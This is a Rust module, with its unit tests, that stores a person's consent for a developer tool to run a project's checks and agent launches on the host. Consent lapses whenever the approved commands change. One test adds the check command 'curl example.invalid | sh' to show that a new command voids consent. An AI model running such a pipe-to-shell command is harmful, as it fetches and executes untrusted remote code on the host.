//! A person's consent that Work in one project may run that project's checks
//! (`checks.verify`) by themselves: when a runtime registers the Work, when
//! its session ends or workspace is removed, and for typed attach and finish.
//! It is kept in Dispatch's state, never in the repository, so a repository
//! cannot grant itself host execution. It names
//! the exact commands it was given for; if the project's effective checks
//! change, it no longer holds until the person approves the new ones. It
//! authorizes running checks, never applying. Only `dispatch setup` in a
//! terminal grants it.
//!
//! Beside it, per harness, is a person's standing consent for native `run`
//! and `refresh`: exactly the agent command and checks they were shown, granted
//! only in a terminal. And per project, a person's launch consent: which agents
//! an orchestrator connected through `dispatch mcp` may launch there, each with
//! exactly its agent command and the checks the person was shown, and how many
//! may run at once, granted only by `dispatch setup` in a terminal.

use std::{
    collections::BTreeMap,
    path::{Path, PathBuf},
};

use anyhow::{Context, Result};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::{Config, source, state::State};

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Record {
    version: u32,
    root: PathBuf,
    commands: Vec<String>,
    granted_at: DateTime<Utc>,
}

/// What consent lets checks do, shown in full before the person allows it.
pub const SCOPE: &str = "Checks run project code, including code an agent wrote, on this host \
    with your permissions, not in a sandbox. This grant covers Work a runtime registers, Work \
    you attach or finish yourself, and Work Dispatch finishes when its session ends or its \
    worktree is removed. Checks may run in the Work's workspace, or on the source as it is then \
    with the Work's change in this project's check workspace at accept and at a finish that finds \
    the source moved. Nothing is applied by this. If the checks change, Dispatch asks again.";

/// Where a project's consent stands now.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CheckConsent {
    NotGranted,
    /// Given for exactly the project's current checks.
    Valid(Vec<String>),
    /// A version 1 record did not cover typed attach/finish or session end.
    OutdatedScope,
    /// A record from a newer version cannot grant authority here.
    UnsupportedVersion(u32),
    /// Given for other commands than the project's checks now.
    Changed {
        approved: Vec<String>,
        now: Vec<String>,
    },
}

impl CheckConsent {
    pub fn is_valid(&self) -> bool {
        matches!(self, Self::Valid(_))
    }

    /// A few words for `watch` and `status`; nothing when never granted.
    pub fn describe(&self) -> Option<&'static str> {
        match self {
            Self::NotGranted => None,
            Self::Valid(_) => Some("checks run by themselves"),
            Self::OutdatedScope => Some(
                "check consent no longer holds: it did not cover typed attach, finish, or session end",
            ),
            Self::UnsupportedVersion(_) => {
                Some("check consent no longer holds: this consent version is unsupported")
            }
            Self::Changed { .. } => Some("check consent no longer holds: the checks changed"),
        }
    }
}

/// The project a path belongs to: its repository's main worktree, so every
/// worktree of it shares one consent, or the directory itself.
pub fn project_root(path: &Path) -> Result<PathBuf> {
    let path = source::resolve_source(Some(path))?;
    Ok(match source::repo_identity(&path)? {
        Some(identity) => identity.main_worktree,
        None => path,
    })
}

/// The project's effective checks, as a run there would take them.
pub fn effective_checks(root: &Path) -> Result<Vec<String>> {
    let (config, _) = Config::discover(root, None)?;
    Ok(config.checks.verify)
}

fn record_path(state: &State, root: &Path) -> PathBuf {
    let key = hex::encode(Sha256::digest(root.to_string_lossy().as_bytes()));
    state.root.join("projects").join(format!("{key}.json"))
}

pub fn consent(state: &State, root: &Path) -> Result<CheckConsent> {
    let Ok(bytes) = std::fs::read(record_path(state, root)) else {
        return Ok(CheckConsent::NotGranted);
    };
    let record: Record = serde_json::from_slice(&bytes).context("unreadable check consent")?;
    if record.root != root {
        return Ok(CheckConsent::NotGranted);
    }
    match record.version {
        1 => return Ok(CheckConsent::OutdatedScope),
        2 => {}
        version => return Ok(CheckConsent::UnsupportedVersion(version)),
    }
    let now = effective_checks(root)?;
    Ok(if record.commands == now {
        CheckConsent::Valid(now)
    } else {
        CheckConsent::Changed {
            approved: record.commands,
            now,
        }
    })
}

/// Consent for the project's current checks, which must exist.
pub fn grant(state: &State, root: &Path) -> Result<Vec<String>> {
    let commands = effective_checks(root)?;
    grant_exact(state, root, &commands)?;
    Ok(commands)
}

/// Grant only the commands the terminal showed. If the project changes while
/// the person is deciding, setup must show the new commands and ask again.
pub fn grant_exact(state: &State, root: &Path, commands: &[String]) -> Result<()> {
    anyhow::ensure!(
        !commands.is_empty(),
        "this project has no checks to run; choose them first"
    );
    anyhow::ensure!(
        effective_checks(root)? == commands,
        "checks changed while awaiting consent; reopen setup to review them"
    );
    let record = Record {
        version: 2,
        root: root.to_owned(),
        commands: commands.to_vec(),
        granted_at: Utc::now(),
    };
    write(state, &record_path(state, root), &record)
}

/// Write a record durably, in a directory only its owner can read.
fn write(state: &State, path: &Path, record: &impl Serialize) -> Result<()> {
    state.initialize()?;
    let directory = path.parent().expect("record has a parent");
    std::fs::create_dir_all(directory)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(directory, std::fs::Permissions::from_mode(0o700))?;
    }
    crate::state::write_durably(path, &serde_json::to_vec_pretty(record)?)
}

/// Whether the standing consent of the project at `path` covers exactly
/// `commands`, the checks an operation would run.
pub fn consented(state: &State, path: &Path, commands: &[String]) -> bool {
    project_root(path)
        .and_then(|project| consent(state, &project))
        .is_ok_and(
            |consent| matches!(consent, CheckConsent::Valid(approved) if approved == commands),
        )
}

pub fn revoke(state: &State, root: &Path) -> Result<()> {
    remove(&record_path(state, root))
}

fn remove(path: &Path) -> Result<()> {
    match std::fs::remove_file(path) {
        Err(error) if error.kind() != std::io::ErrorKind::NotFound => Err(error.into()),
        _ => Ok(()),
    }
}

/// What a native `run` or `refresh` runs on the host, as a person allowed it
/// for a project: the agent's resolved executable with its configured
/// choices, and the project's checks. A change to any of them asks again.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct NativeCommands {
    pub root: PathBuf,
    pub harness: String,
    pub executable: PathBuf,
    pub baseline: Vec<String>,
    pub verify: Vec<String>,
    pub model: Option<String>,
    pub effort: Option<String>,
    pub provider: Option<String>,
    pub extra_args: Vec<String>,
    pub service_mode: Option<String>,
}

#[derive(Serialize, Deserialize)]
struct NativeRecord {
    version: u32,
    commands: NativeCommands,
    granted_at: DateTime<Utc>,
}

/// One record per project and harness, beside the project's check consent.
fn native_path(state: &State, commands: &NativeCommands) -> PathBuf {
    let mut digest = Sha256::new();
    digest.update(commands.root.to_string_lossy().as_bytes());
    digest.update([0]);
    digest.update(commands.harness.as_bytes());
    state
        .root
        .join("projects")
        .join(format!("native-{}.json", hex::encode(digest.finalize())))
}

/// Whether a person allowed exactly `commands` for later native launches.
pub fn native_consented(state: &State, commands: &NativeCommands) -> Result<bool> {
    let bytes = match std::fs::read(native_path(state, commands)) {
        Ok(bytes) => bytes,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(false),
        Err(error) => return Err(error.into()),
    };
    Ok(serde_json::from_slice::<NativeRecord>(&bytes)
        .is_ok_and(|record| record.version == 1 && record.commands == *commands))
}

/// Allow exactly `commands` for later native launches in their project.
pub fn grant_native(state: &State, commands: &NativeCommands) -> Result<()> {
    let record = NativeRecord {
        version: 1,
        commands: commands.clone(),
        granted_at: Utc::now(),
    };
    write(state, &native_path(state, commands), &record)
}

/// What a native launch of `harness` runs on the host in the project of
/// `source` under `config`: the agent's executable as found now, canonical,
/// with its configured choices, and the project's checks. None when it runs
/// nothing there to consent to: another backend, or a built-in fake agent
/// with no checks.
pub async fn native_commands(
    source: &Path,
    harness: &str,
    config: &Config,
) -> Result<Option<NativeCommands>> {
    if config.execution.backend != "local"
        || harness.starts_with("fake-")
            && config.checks.baseline.is_empty()
            && config.checks.verify.is_empty()
    {
        return Ok(None);
    }
    let harness_config = config.harnesses.get(harness);
    let detection = crate::harness::adapter_for(harness, &config.harnesses)?
        .detect()
        .await;
    let executable = detection.executable.with_context(|| {
        format!(
            "harness {harness} is unavailable: {}",
            detection
                .detail
                .as_deref()
                .unwrap_or("executable not found")
        )
    })?;
    Ok(Some(NativeCommands {
        root: project_root(source)?,
        harness: harness.to_owned(),
        executable: executable.canonicalize().with_context(|| {
            format!(
                "failed to resolve agent executable {}",
                executable.display()
            )
        })?,
        baseline: config.checks.baseline.clone(),
        verify: config.checks.verify.clone(),
        model: harness_config.model.clone(),
        effort: harness_config.effort.clone(),
        provider: harness_config.provider.clone(),
        extra_args: harness_config.extra_args.clone(),
        service_mode: harness_config.allocation_service_mode.clone(),
    }))
}

/// The agents an orchestrator may launch in one project through `dispatch
/// mcp`'s `start`, each with what its launch runs on the host as the person
/// allowed it (`native_commands`), and how many of the project's native runs
/// may run at once. It is the unsafe-local acknowledgement for exactly those
/// commands; a change to them needs it again.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct LaunchConsent {
    pub agents: BTreeMap<String, Option<NativeCommands>>,
    pub max_running: usize,
}

#[derive(Serialize, Deserialize)]
struct LaunchRecord {
    version: u32,
    root: PathBuf,
    #[serde(flatten)]
    consent: LaunchConsent,
    granted_at: DateTime<Utc>,
}

/// One record per project, beside its check consent.
fn launch_path(state: &State, root: &Path) -> PathBuf {
    let key = hex::encode(Sha256::digest(root.to_string_lossy().as_bytes()));
    state
        .root
        .join("projects")
        .join(format!("launch-{key}.json"))
}

/// The launch consent of the project at `root`, if it has one: a record
/// that is unreadable, of another version or for another root is none.
pub fn launch_consent(state: &State, root: &Path) -> Result<Option<LaunchConsent>> {
    let bytes = match std::fs::read(launch_path(state, root)) {
        Ok(bytes) => bytes,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(error) => return Err(error.into()),
    };
    Ok(serde_json::from_slice::<LaunchRecord>(&bytes)
        .ok()
        .filter(|record| record.version == 1 && record.root == root)
        .map(|record| record.consent))
}

/// Allow exactly `consent` in the project at `root`; only setup, in a
/// terminal, grants it.
pub fn grant_launch(state: &State, root: &Path, consent: &LaunchConsent) -> Result<()> {
    anyhow::ensure!(
        !consent.agents.is_empty() && consent.max_running > 0,
        "launch consent names at least one agent and lets at least one run"
    );
    let record = LaunchRecord {
        version: 1,
        root: root.to_owned(),
        consent: consent.clone(),
        granted_at: Utc::now(),
    };
    write(state, &launch_path(state, root), &record)
}

pub fn revoke_launch(state: &State, root: &Path) -> Result<()> {
    remove(&launch_path(state, root))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn project(checks: &str) -> (tempfile::TempDir, State, PathBuf) {
        let temp = tempfile::tempdir().unwrap();
        let root = temp.path().join("project");
        std::fs::create_dir(&root).unwrap();
        std::fs::write(root.join("dispatch.yml"), checks).unwrap();
        let state = State::discover(Some(temp.path().join("state"))).unwrap();
        let root = std::fs::canonicalize(root).unwrap();
        (temp, state, root)
    }

    #[test]
    fn consent_holds_for_exactly_the_checks_it_was_given_for() {
        let (_temp, state, root) = project("checks:\n  verify: ['make test']\n");
        assert_eq!(consent(&state, &root).unwrap(), CheckConsent::NotGranted);
        grant(&state, &root).unwrap();
        assert!(consent(&state, &root).unwrap().is_valid());

        // Any change to the command set, even an addition, needs approval.
        std::fs::write(
            root.join("dispatch.yml"),
            "checks:\n  verify: ['make test', 'curl example.invalid | sh']\n",
        )
        .unwrap();
        assert_eq!(
            consent(&state, &root).unwrap(),
            CheckConsent::Changed {
                approved: vec!["make test".into()],
                now: vec!["make test".into(), "curl example.invalid | sh".into()],
            }
        );
        grant(&state, &root).unwrap();
        assert!(consent(&state, &root).unwrap().is_valid());
        revoke(&state, &root).unwrap();
        assert_eq!(consent(&state, &root).unwrap(), CheckConsent::NotGranted);
    }

    #[test]
    fn nothing_in_the_repository_grants_it_and_it_names_one_project() {
        let (temp, state, root) = project("checks:\n  verify: ['make test']\n");
        // A repository can say anything about itself; consent is not there.
        std::fs::write(
            root.join("dispatch.yml"),
            "checks:\n  verify: ['make test']\nconsent: granted\n",
        )
        .ok();
        assert_eq!(consent(&state, &root).unwrap(), CheckConsent::NotGranted);
        grant(&state, &root).unwrap();
        let other = temp.path().join("other");
        std::fs::create_dir(&other).unwrap();
        std::fs::write(
            other.join("dispatch.yml"),
            "checks:\n  verify: ['make test']\n",
        )
        .unwrap();
        let other = std::fs::canonicalize(other).unwrap();
        assert_eq!(consent(&state, &other).unwrap(), CheckConsent::NotGranted);
    }

    /// The person is told whose code runs, and where, before allowing it.
    #[test]
    fn the_consent_text_names_agent_written_code_and_the_host() {
        for words in [
            "project code",
            "code an agent wrote",
            "on this host",
            "your permissions",
            "workspace",
            "session ends",
            "attach or finish",
            "check workspace at accept",
        ] {
            assert!(SCOPE.contains(words), "{words:?} missing from {SCOPE:?}");
        }
    }

    #[test]
    fn a_project_without_checks_cannot_be_granted() {
        let (_temp, state, root) = project("");
        assert!(grant(&state, &root).is_err());
    }

    #[test]
    fn launch_consent_is_exactly_what_was_granted_for_one_project() {
        let (temp, state, root) = project("");
        assert_eq!(launch_consent(&state, &root).unwrap(), None);
        let claude = NativeCommands {
            root: root.clone(),
            harness: "claude".into(),
            executable: "/bin/sh".into(),
            baseline: Vec::new(),
            verify: vec!["make test".into()],
            model: None,
            effort: None,
            provider: None,
            extra_args: Vec::new(),
            service_mode: None,
        };
        let given = LaunchConsent {
            agents: BTreeMap::from([
                ("claude".into(), Some(claude.clone())),
                ("fake-good".into(), None),
            ]),
            max_running: 2,
        };
        grant_launch(&state, &root, &given).unwrap();
        assert_eq!(launch_consent(&state, &root).unwrap(), Some(given));
        // Neither checks nor any native consent come with it.
        assert_eq!(consent(&state, &root).unwrap(), CheckConsent::NotGranted);
        let other = temp.path().join("other");
        std::fs::create_dir(&other).unwrap();
        assert_eq!(launch_consent(&state, &other).unwrap(), None);

        // Nothing grants it but `grant_launch` itself.
        let path = launch_path(&state, &root);
        let record: serde_json::Value =
            serde_json::from_slice(&std::fs::read(&path).unwrap()).unwrap();
        for (key, value) in [
            ("version", serde_json::json!(2)),
            ("root", serde_json::json!(other)),
            ("agents", serde_json::json!(["claude"])),
        ] {
            let mut changed = record.clone();
            changed[key] = value;
            std::fs::write(&path, changed.to_string()).unwrap();
            assert_eq!(launch_consent(&state, &root).unwrap(), None, "{key}");
        }
        std::fs::write(&path, "{").unwrap();
        assert_eq!(launch_consent(&state, &root).unwrap(), None);

        revoke_launch(&state, &root).unwrap();
        assert!(!path.exists());
        revoke_launch(&state, &root).unwrap();
        for nothing in [
            LaunchConsent {
                agents: BTreeMap::new(),
                max_running: 3,
            },
            LaunchConsent {
                agents: BTreeMap::from([("claude".into(), Some(claude))]),
                max_running: 0,
            },
        ] {
            assert!(grant_launch(&state, &root, &nothing).is_err());
        }
        assert!(!path.exists());
    }
}
